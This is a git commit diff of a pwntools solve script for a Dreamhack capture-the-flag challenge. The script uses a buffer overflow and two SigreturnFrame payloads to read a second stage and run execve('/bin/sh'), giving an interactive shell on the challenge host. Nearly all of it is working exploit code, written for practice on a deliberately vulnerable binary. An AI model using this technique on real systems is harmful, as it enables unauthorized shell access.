5df96d8eee48e19e93379db49331415920a200d3
nhh9905 <hoanglclvt@gmail.com>
2025-04-16 11:22:09 +0700

    pwn

--- dreamhack/srop/SigReturn-Oriented Programming/solve.py
+++ dreamhack/srop/SigReturn-Oriented Programming/solve.py
@@ -5,49 +5,51 @@ from pwn import *
 exe = ELF("./srop", checksec=False)
 context.binary = exe
 
-def conn():
-    if args.LOCAL:
-        p = process([exe.path])
-        if args.DEBUG:
-            gdb.attach(p)
-    else:
-        p = remote("host1.dreamhack.games", 16744)
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+            b* 0x0000000000400516
+            c
+            ''')
 
-    return p
+if args.LOCAL:
+    p = process([exe.path])
+else:
+    p = remote("host1.dreamhack.games", 16744)
 
-def main():
-    p = conn()
+# GDB()
+pop_rax = 0x00000000004004eb
+syscall = 0x00000000004004ec
+frame = SigreturnFrame()
+frame.rax = 0
+frame.rdi = 0
+frame.rsi = 0x601a00
+frame.rdx = 0x200
+frame.rsp = 0x601a00
+frame.rip = syscall
 
-    input()
+payload = b'a'*24
+payload += flat(
+    pop_rax, 0xf,
+    bytes(frame)
+    )
+p.send(payload)
 
-    pop_rax = 0x00000000004004eb
-    syscall = 0x00000000004004ec
-    frame = SigreturnFrame()
-    frame.rax = 0
-    frame.rdi = 0
-    frame.rsi = 0x601a00
-    frame.rdx = 0x200
-    frame.rsp = 0x601a00
-    frame.rip = syscall
+input("Press ENTER to send payload")
 
-    payload = b'a'*24 + p64(pop_rax) + p64(0xf)
-    payload += bytes(frame)
-    p.send(payload)
+frame = SigreturnFrame()
+frame.rax = 0x3b
+frame.rdi = 0x601b08
+frame.rsi = 0
+frame.rdx = 0
+frame.rsp = 0x601b08
+frame.rip = syscall
+payload = flat(
+    pop_rax, 0xf,
+    bytes(frame),
+    b'/bin/sh'
+    )
+print(len(payload))
+p.send(payload)
 
-    input("Press ENTER to send payload")
-
-    frame = SigreturnFrame()
-    frame.rax = 0x3b
-    frame.rdi = 0x601b08
-    frame.rsi = 0
-    frame.rdx = 0
-    frame.rsp = 0x601b08
-    frame.rip = syscall
-    payload = p64(pop_rax) + p64(0xf) + bytes(frame) + b'/bin/sh'
-    print(len(payload))
-    p.send(payload)
-
-    p.interactive()
-
-if __name__ == "__main__":
-    main()
+p.interactive()
